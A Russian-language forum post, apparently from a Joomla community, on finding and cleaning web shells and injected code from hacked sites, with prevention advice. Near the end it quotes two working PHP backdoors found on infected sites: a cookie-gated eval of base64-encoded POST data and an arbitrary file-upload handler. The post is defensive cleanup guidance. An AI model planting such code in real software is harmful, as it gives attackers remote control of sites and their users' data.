Поиск и удаление

Главное понимание того, что если сайт на хосте не один, то искать и чистить надо все, shell может быть на соседнем сайте и заражать не тот сайт, а только какой то определенный из соседних, и все думают, что зараза только на том что редиректит или ПС его блокирует
99% - Это Ваше первая ошибка и заблуждение


- смотрим дату измененных файлов
- смотрим логи сервера, смотрим обращение в это время к каким файла

важно! при работе надо закрывать доступ к сайту или делать все локально скачав файлы

- если не видим то, берем сканер поиска shell он покажет файлы которые надо просмотреть на наличие записанного shell-а, после того как нашли, так же потом смотрим логи по этому времени, для чего смотреть да для того чтоб увидеть через что попал shell и закрыть эту дверь (последние через что заливают это редактор JCE, менеджер расширений nonumber.nl, ну и старые не актуальные версии joomla)
- найдя и удалив shell переходим к удалению вредного кода, он может быть в файлах .htaccess, *.js, *.php
в .htaccess дописывается обычно "партянка" редиректов ее сразу видно
в *.js дописывается обычно в конец файла
Показать текстовый блок
в *.php дописывается обычно в начало или ко всем <?php
Показать текстовый блок
код могут дописать и в большинстве случаев, пишут за экран с большим отступом в право

это расписано простое направление в какую сторону двигаться, поймите все случаи разные и индивидуального характера, Ваш может быть другим, но смысл один

Как чистить файлы
- по найденному коду делать поиск найденного кода и его замену, любой программой если локально начиная от Notepad++ и теми программами которые могут вести поиск и замену в файлах, если на хостинге, то делать это скриптом поиска и замены
- возможно сделать это и по другому если вы полностью уверены что файлы сайта не изменялись то можно просто пере залить чистые файлы сверху зараженных от версии которая у вас

Как избежать
Про это пишут все и всегда и очень много
- делать постоянно бэкапы
- своевременное обновление как CMS так и всех расширений
- создавать пароли из букв (прописных и заглавных) и цифр, возможно использовать символы, чем длиннее тем лучше, это на случай брута админки
- взять за правило менять пароли, хоста, ftp, админки, и даже бд и это не параноя, а простое правило
- вести логи сервера с ротацией и чем больше срок их хранения тем лучше

те кто пишет что "мол у меня три года сайту и я не обновлялся" и "ни чего не было" им просто повезло, но в дальнейшем везти не будет с каждым днем просто находятся новые дыры и растут взломы, становится много сайтов и так же много тех кто ломает их
Чтобы избежать этого требуется следить за сайтами ежедневно работать, сайт это уже работа или хобби, на которые требуется тратить ежедневно время

Думаю если кто либо в топике распишет как он боролся именно у себя с проблемой заражения, то получиться более развернутое описание и описаны будут многие случаи более развернуто.

Вроде доступно написал без всяких терминов для тех кто ни понимает что такое shell (многие думают что вирус)

Цитировать
shell - утилита на подобии файлового менеджера, для удаленного подключение и удобной работы с файлами, это не вирус "черный вход", возможность пользования как из браузера так и с командной строки, ваши пароли если его залили не помеха(не требуется ему ftp и админка) это своего рода панель так которой вы пользуетесь на хостинге, там есть доступ как к файлам так и к БД, вы читаете про вирусный код и про код редиректов, shell ни какого отношения не имеет к ним, эту утилиту только могут закодировать в base64, но такое редко профи его кодируют по другому, shell также может находиться на другом сервере а у вас использоваться короткий код подключения к нему

Что требуется еще:

Права на папки и файлы ставим правильно

Как заливают shell:

Все просто нового ни чего не изобрели и не изобретут(хотя возможно но нет уверенности)
файл с shell заливается в основном в папки
Цитировать
images
images/stories
tmp

заливают либо сразу файл shell, либо "якобы картинку" файл с кодом и с расширением от изображения, который после загрузки либо остается таким же или ему меняют расширение, если он остается картинкой то тогда в этой директории появляется еще и файл .htaccesss для того чтоб этот файл работал


В конце того года появились новые вставки кода, для тех кто не знает опишу, в файлы движка либо просто в сторонние файлы (чаще всего) вставляется код

Скрыть текстовый блок
Код:

if(!empty($_COOKIE['__utma']) and substr($_COOKIE['__utma'],0,16)=='3469825000034634'){
if (!empty($_POST['msg']) and $msg=@gzinflate(@base64_decode(@str_replace(' ','',urldecode($_POST['msg']))))){
  echo '<textarea id=areatext>';
  eval($msg);
  echo '</textarea>bg';
  exit;
}}


или

Скрыть текстовый блок
Код:

error_reporting(0);
if($_GET["success"]=="1"){
$hedef = $_GET["where"]; 
$hedef = "".$hedef."".basename($_FILES['filenam']['name'])."";
if(move_uploaded_file($_FILES['filenam']['tmp_name'], $hedef))
{echo "success";}else {echo "fail";}
}


или еще множество вариантов исполнения, многие уже знают об этом кто то нет, файлов отношение которые не имеют к движку может быть сотни и названия у них разные у всех, так что могу только посочувствовать тем кто не понимает PHP и сам пытается что то найти и удалить месяцами.

Встречается случаи когда кеш системы не чистится, и после чистки файлов все равно нет результата
один из способов это почистить в БД таблицу #_session  не всегда помогает на 100%, видимо еще и кешируется у провайдера или на каких либо удаленных серверах
